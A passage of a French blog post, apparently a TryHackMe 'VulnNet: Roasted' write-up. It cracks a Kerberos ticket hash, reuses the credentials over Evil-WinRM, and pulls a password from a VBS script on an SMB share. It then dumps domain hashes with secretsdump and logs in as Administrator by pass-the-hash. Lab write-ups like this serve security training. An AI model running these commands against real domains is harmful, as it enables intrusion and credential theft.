+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS-REP etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, <span class="s1">'h'</span> <span class="k">for </span><span class="nb">help</span>, almost any other key <span class="k">for </span>status
+<span class="nv">ry</span><span class="o">=</span>ibfkfv,s6h,   <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:00:01 DONE <span class="o">(</span>2024-05-12 12:04<span class="o">)</span> 0.8621g/s 3559Kp/s 3559Kc/s 3559KC/s sadeceben123..ruddle
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+<p>Parfait ! On a récupéré le mot de passe de l’utilisateur <strong>enterprise-core-vn</strong> qui est <strong>ry=ibfkfv,s6h,</strong>.</p>
+
+<h4 id="evil-winrm">Evil-WinRM</h4>
+
+<p>Maintenant on peut se connecter à la machine avec Evil-WinRM:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 12:06:27 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># evil-winrm -i 10.10.211.33 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'</span>
+
+
+Evil-WinRM shell v3.5
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-core-vn<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-core-vn<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-core-vn&gt; <span class="nb">cd</span> <span class="s2">"C:/Users/enterprise-core-vn/Desktop/"</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-core-vn<span class="se">\D</span>esktop&gt; <span class="nb">type</span> <span class="s2">"C:/Users/enterprise-core-vn/Desktop/user.txt"</span>
+THM<span class="o">{</span>726b7c0baaac1455d05c827b5561f4ed<span class="o">}</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\e</span>nterprise-core-vn<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<p>On a récupéré le flag utilisateur <strong>THM{726b7c0baaac1455d05c827b5561f4ed}</strong>.</p>
+
+<h3 id="escalade-de-privilèges">Escalade de privilèges</h3>
+
+<h4 id="smb">SMB</h4>
+
+<p>On peut maintenant regarder les partages SMB avec <code class="language-plaintext highlighter-rouge">smbmap</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 12:14:43 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># smbmap -H "10.10.211.33" -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'</span>
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /<span class="s2">"       )|"</span>  <span class="se">\ </span>   /<span class="s2">"  ||   _  "</span><span class="se">\ </span>|<span class="s2">"  </span><span class="se">\ </span><span class="s2">   /"</span>  |     /<span class="s2">""</span><span class="se">\ </span>      |   __ <span class="s2">"</span><span class="se">\</span><span class="s2">
+  (:   </span><span class="se">\_</span><span class="s2">__/  </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |(. |_)  :) </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |    /    </span><span class="se">\ </span><span class="s2">     (. |__) :)
+   </span><span class="se">\_</span><span class="s2">__  </span><span class="se">\ </span><span class="s2">   /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\/</span><span class="s2">.    ||:     </span><span class="se">\/</span><span class="s2">   /</span><span class="se">\ </span><span class="s2">  </span><span class="se">\/</span><span class="s2">.    |   /' /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\ </span><span class="s2">    |:  ____/
+    __/  </span><span class="se">\ </span><span class="s2">  |: </span><span class="se">\.</span><span class="s2">        |(|  _  </span><span class="se">\ </span><span class="s2"> |: </span><span class="se">\.</span><span class="s2">        |  //  __'  </span><span class="se">\ </span><span class="s2">   (|  /
+   /"</span> <span class="se">\ </span>  :<span class="o">)</span> |.  <span class="se">\ </span>   /:  <span class="o">||</span>: |_<span class="o">)</span>  :<span class="o">)</span>|.  <span class="se">\ </span>   /:  | /   /  <span class="se">\ </span>  <span class="se">\ </span> /|__/ <span class="se">\</span>
+  <span class="o">(</span>_______/  |___|<span class="se">\_</span>_/|___|<span class="o">(</span>_______/ |___|<span class="se">\_</span>_/|___|<span class="o">(</span>___/    <span class="se">\_</span>__<span class="o">)(</span>_______<span class="o">)</span>
+ <span class="nt">-----------------------------------------------------------------------------</span>
+ SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB connections<span class="o">(</span>s<span class="o">)</span> and 1 authentidated session<span class="o">(</span>s<span class="o">)</span>
+
+<span class="o">[</span>+] IP: 10.10.211.33:445	Name: vulnnet-rst.local   	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
+	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
+	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share
+	SYSVOL                                            	READ ONLY	Logon server share
+	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
+	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing
+</code></pre></div></div>
+
+<p>On a deux partages SMB:</p>
+<ul>
+  <li><strong>VulnNet-Business-Anonymous</strong></li>
+  <li><strong>VulnNet-Enterprise-Anonymous</strong></li>
+</ul>
+
+<p>Les autre partages sont des partages par défaut de Windows.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 12:18:05 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># smbclient \\\\10.10.211.33\\SYSVOL -U 'enterprise-core-vn%ry=ibfkfv,s6h,'</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Thu Mar 11 19:19:49 2021
+  ..                                  D        0  Thu Mar 11 19:19:49 2021
+  vulnnet-rst.local                  Dr        0  Thu Mar 11 19:19:49 2021
+
+		8771839 blocks of size 4096. 4553871 blocks available
+smb: <span class="se">\&gt;</span> <span class="nb">cd </span>vulnnet-rst.local<span class="se">\</span>
+smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Thu Mar 11 19:23:40 2021
+  ..                                  D        0  Thu Mar 11 19:23:40 2021
+  DfsrPrivate                      DHSr        0  Thu Mar 11 19:23:40 2021
+  Policies                            D        0  Thu Mar 11 19:20:26 2021
+  scripts                             D        0  Tue Mar 16 23:15:49 2021
+
+		8771839 blocks of size 4096. 4553871 blocks available
+smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\&gt;</span> <span class="nb">cd </span>scripts<span class="se">\</span>
+smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\s</span>cripts<span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Tue Mar 16 23:15:49 2021
+  ..                                  D        0  Tue Mar 16 23:15:49 2021
+  ResetPassword.vbs                   A     2821  Tue Mar 16 23:18:14 2021
+
+		8771839 blocks of size 4096. 4553871 blocks available
+smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\s</span>cripts<span class="se">\&gt;</span> wget ResetPassword.vbs
+wget: <span class="nb">command </span>not found
+smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\s</span>cripts<span class="se">\&gt;</span> get ResetPassword.vbs
+getting file <span class="se">\v</span>ulnnet-rst.local<span class="se">\s</span>cripts<span class="se">\R</span>esetPassword.vbs of size 2821 as ResetPassword.vbs <span class="o">(</span>0.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.3 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\v</span>ulnnet-rst.local<span class="se">\s</span>cripts<span class="se">\&gt;</span> <span class="nb">exit</span>
+</code></pre></div></div>
+
+<p>On a récupéré le script <strong>ResetPassword.vbs</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="o">[</span>May 12, 2024 - 12:20:21 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># cat ResetPassword.vbs</span>
+Option Explicit
+
+Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
+Dim strUserDN, objUser, strPassword, strUserNTName
+
+<span class="s1">' Constants for the NameTranslate object.
+Const ADS_NAME_INITTYPE_GC = 3
+Const ADS_NAME_TYPE_NT4 = 3
+Const ADS_NAME_TYPE_1779 = 1
+
+If (Wscript.Arguments.Count &lt;&gt; 0) Then
+    Wscript.Echo "Syntax Error. Correct syntax is:"
+    Wscript.Echo "cscript ResetPassword.vbs"
+    Wscript.Quit
+End If
+
+strUserNTName = "a-whitehat"
+strPassword = "bNdKVkjv3RR9ht"
+
+'</span> Determine DNS domain name from RootDSE object.
+Set objRootDSE <span class="o">=</span> GetObject<span class="o">(</span><span class="s2">"LDAP://RootDSE"</span><span class="o">)</span>
+strDNSDomain <span class="o">=</span> objRootDSE.Get<span class="o">(</span><span class="s2">"defaultNamingContext"</span><span class="o">)</span>
+
+<span class="s1">' Use the NameTranslate object to find the NetBIOS domain name from the
+'</span> DNS domain name.
+Set objTrans <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">"NameTranslate"</span><span class="o">)</span>
+objTrans.Init ADS_NAME_INITTYPE_GC, <span class="s2">""</span>
+objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
+strNetBIOSDomain <span class="o">=</span> objTrans.Get<span class="o">(</span>ADS_NAME_TYPE_NT4<span class="o">)</span>
+<span class="s1">' Remove trailing backslash.
+strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)
+
+'</span> Use the NameTranslate object to convert the NT user name to the
+<span class="s1">' Distinguished Name required for the LDAP provider.
+On Error Resume Next
+objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain &amp; "\" &amp; strUserNTName
+If (Err.Number &lt;&gt; 0) Then
+    On Error GoTo 0
+    Wscript.Echo "User " &amp; strUserNTName _
+        &amp; " not found in Active Directory"
+    Wscript.Echo "Program aborted"
+    Wscript.Quit
+End If
+strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
+'</span> Escape any forward slash characters, <span class="s2">"/"</span>, with the backslash
+<span class="s1">' escape character. All other characters that should be escaped are.
+strUserDN = Replace(strUserDN, "/", "\/")
+
+'</span> Bind to the user object <span class="k">in </span>Active Directory with the LDAP provider.
+On Error Resume Next
+Set objUser <span class="o">=</span> GetObject<span class="o">(</span><span class="s2">"LDAP://"</span> &amp; strUserDN<span class="o">)</span>
+If <span class="o">(</span>Err.Number &lt;<span class="o">&gt;</span> 0<span class="o">)</span> Then
+    On Error GoTo 0
+    Wscript.Echo <span class="s2">"User "</span> &amp; strUserNTName _
+        &amp; <span class="s2">" not found in Active Directory"</span>
+    Wscript.Echo <span class="s2">"Program aborted"</span>
+    Wscript.Quit
+End If
+objUser.SetPassword strPassword
+If <span class="o">(</span>Err.Number &lt;<span class="o">&gt;</span> 0<span class="o">)</span> Then
+    On Error GoTo 0
+    Wscript.Echo <span class="s2">"Password NOT reset for "</span> &amp;vbCrLf &amp; strUserNTName
+    Wscript.Echo <span class="s2">"Password "</span> &amp; strPassword &amp; <span class="s2">" may not be allowed, or"</span>
+    Wscript.Echo <span class="s2">"this client may not support a SSL connection."</span>
+    Wscript.Echo <span class="s2">"Program aborted"</span>
+    Wscript.Quit
+Else
+    objUser.AccountDisabled <span class="o">=</span> False
+    objUser.Put <span class="s2">"pwdLastSet"</span>, 0
+    Err.Clear
+    objUser.SetInfo
+    If <span class="o">(</span>Err.Number &lt;<span class="o">&gt;</span> 0<span class="o">)</span> Then
+        On Error GoTo 0
+        Wscript.Echo <span class="s2">"Password reset for "</span> &amp; strUserNTName
+        Wscript.Echo <span class="s2">"But, unable to enable account or expire password"</span>
+        Wscript.Quit
+    End If
+End If
+On Error GoTo 0
+
+Wscript.Echo <span class="s2">"Password reset, account enabled,"</span>
+Wscript.Echo <span class="s2">"and password expired for user "</span> &amp; strUserNTName#
+</code></pre></div></div>
+
+<p>HOP ! On a des credentials:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strUserNTName <span class="o">=</span> <span class="s2">"a-whitehat"</span>
+strPassword <span class="o">=</span> <span class="s2">"bNdKVkjv3RR9ht"</span>
+</code></pre></div></div>
+
+<h4 id="privesc">privesc</h4>
+
+<p>On peut maintenant se connecter à la machine avec Evil-WinRM:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 12:24:24 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># evil-winrm -i 10.10.211.33 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'</span>
+
+
+Evil-WinRM shell v3.5
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span><span class="nt">-whitehat</span><span class="se">\D</span>ocuments&gt; <span class="nb">dir</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span><span class="nt">-whitehat</span><span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /all
+
+USER INFORMATION
+<span class="nt">----------------</span>
+
+User Name              SID
+<span class="o">======================</span> <span class="o">=============================================</span>
+vulnnet-rst<span class="se">\a</span><span class="nt">-whitehat</span> S-1-5-21-1589833671-435344116-4136949213-1105
+
+
+GROUP INFORMATION
+<span class="nt">-----------------</span>
+
+Group Name                                         Type             SID                                          Attributes
+<span class="o">==================================================</span> <span class="o">================</span> <span class="o">============================================</span> <span class="o">===============================================================</span>
+Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\U</span>sers                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\A</span>dministrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
+NT AUTHORITY<span class="se">\N</span>ETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\A</span>uthenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\T</span>his Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+VULNNET-RST<span class="se">\D</span>omain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
+VULNNET-RST<span class="se">\D</span>enied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY<span class="se">\N</span>TLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label<span class="se">\H</span>igh Mandatory Level               Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                            Description                                                        State
+<span class="o">=========================================</span> <span class="o">==================================================================</span> <span class="o">=======</span>
+SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="k">for </span>a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system <span class="nb">time                                             </span>Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted <span class="k">for </span>delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working <span class="nb">set                                     </span>Enabled
+SeTimeZonePrivilege                       Change the <span class="nb">time </span>zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="k">for </span>another user <span class="k">in </span>the same session Enabled
+
+
+USER CLAIMS INFORMATION
+<span class="nt">-----------------------</span>
+
+User claims unknown.
+
+Kerberos support <span class="k">for </span>Dynamic Access Control on this device has been disabled.
+</code></pre></div></div>
+
+<p>Ici on a des informations intéressantes:</p>
+
+<ul>
+  <li><strong>VULNNET-RST\Domain Admins</strong></li>
+</ul>
+
+<p>Une fois que l’on a ça on peut penser a faire un secretsdump</p>
+
+<h4 id="secretsdump">secretsdump</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 12:28:48 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># secretsdump VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.211.33</span>
+Impacket <span class="k">for </span>Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Service RemoteRegistry is <span class="k">in </span>stopped state
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service RemoteRegistry
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping <span class="nb">local </span>SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+<span class="o">[</span>-] SAM hashes extraction <span class="k">for </span>user WDAGUtilityAccount failed. The account doesn<span class="s1">'t have hash information.
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:d1cf5bd71959114ef8a147a565ae44490134863025a53ea637e5005ea0f8e2da
+VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:475c9d59b8f1d616ccb630e93ae31fc0
+VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:e32f734cda85a7ea
+VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:63edeac7b7c3c8e4fdf2b0731130beeb27815486e1afe3a870b55e7ec03efe78f9c63885fe1511b2cbe66b5c93abd83bc084c3cfb725d6e6c4a08de89a2a821b182b87880d9c7c62f7bc8c183f200345c06155413f2268def9fe3b02eeb639b77a375356316ead43330ece1a33e9866f2998bf1fca8c56c0caa0656c863996aaf41eed3de33de526e90340e2ff85ad774189857528cc1281c31519c28318c3541a306ecb034631d5b9491ba2e35858c023e4e68af1c7f198e36400bd988f097bbaf069307c6842274a50f1ab8815dc12ea1b7637d684e90e470d1f7c69712e77050cda0bf34b3bce2a3c9a590da9bb7e
+VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:b53e5ad16472b47f8fb7292cc3f1f55a:::
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
+dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
+[*] NL$KM
+ 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
+ 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
+ 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
+ 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
+NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
+vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
+vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
+vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
+vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
+vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
+WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:b53e5ad16472b47f8fb7292cc3f1f55a:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
+Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
+Administrator:des-cbc-md5:52d325cb2acd8fc1
+krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
+krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
+krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
+vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
+vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
+vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
+vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
+vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
+vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
+vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
+vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
+vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
+vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
+vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
+vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
+vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
+vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
+vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
+WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:d1cf5bd71959114ef8a147a565ae44490134863025a53ea637e5005ea0f8e2da
+WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:475c9d59b8f1d616ccb630e93ae31fc0
+WIN-2BO8M1OE1M1$:des-cbc-md5:1f579149bc9252e6
+[*] Cleaning up...
+[*] Stopping service RemoteRegistry
+[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
+[*] Cleaning up...
+[*] Stopping service RemoteRegistry
+</span></code></pre></div></div>
+
+<p>Nous avons le hash NT de l’administrateur:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+</code></pre></div></div>
+
+<h4 id="evil-winrm-1">evil-winrm</h4>
+
+<p>On peut maintenant se connecter à la machine avec Evil-WinRM:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>May 12, 2024 - 12:32:52 <span class="o">(</span>UTC<span class="o">)]</span> exegol-thm VulnNet: Roasted <span class="c"># evil-winrm -i 10.10.211.33 -u 'Administrator' -H 'c2597747aa5e43022a3a3049a3c3b09d'</span>
+
+
+Evil-WinRM shell v3.5
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>vulnnet-rst<span class="se">\a</span>dministrator
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; Get-Content <span class="s2">"C:/Users/Administrator/Desktop/system.txt"</span>
+THM<span class="o">{</span>16f45e3934293a57645f8d7bf71d8d4c<span class="o">}</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">exit
+
+</span>Info: Exiting with code 0
+</code></pre></div></div>
+
+<p>On a récupéré le flag root <strong>THM{16f45e3934293a57645f8d7bf71d8d4c}</strong>.</p>
+
+<p>Voilà, c’est terminé pour cette room. J’espère que vous avez apprécié. Si vous avez des questions ou des suggestions n’hésitez pas à me contacter sur <a href="https://www.linkedin.com/in/lukas-taboga-5a8040237/">linkedin</a>.</p>
+
+  </article>
+</div>
+<div class="keywords">
+    <span class="post-tags"><a href="/archives/#active-directory"><i class="fas fa-tags"></i> Active Directory</a><a href="/archives/#kerberos"><i class="fas fa-tags"></i> Kerberos</a><a href="/archives/#as-rep-roasting"><i class="fas fa-tags"></i> AS-REP Roasting</a></span>
+  </div>
+
+
+
+<div class="related">
+  <h2>Articles similaires</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/probe-attack/">
+            Probe Attack
+            <small>20 Aug 2024</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/m5stack-cardputer/">
+            M5stack Cardputer
+            <small>20 Aug 2024</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/rubber-ducky-attiny85/">
+            Rubber Ducky (ATtiny85)
+            <small>01 Apr 2024</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+<div id="disqus_thread"></div>
+<script>
+    /**
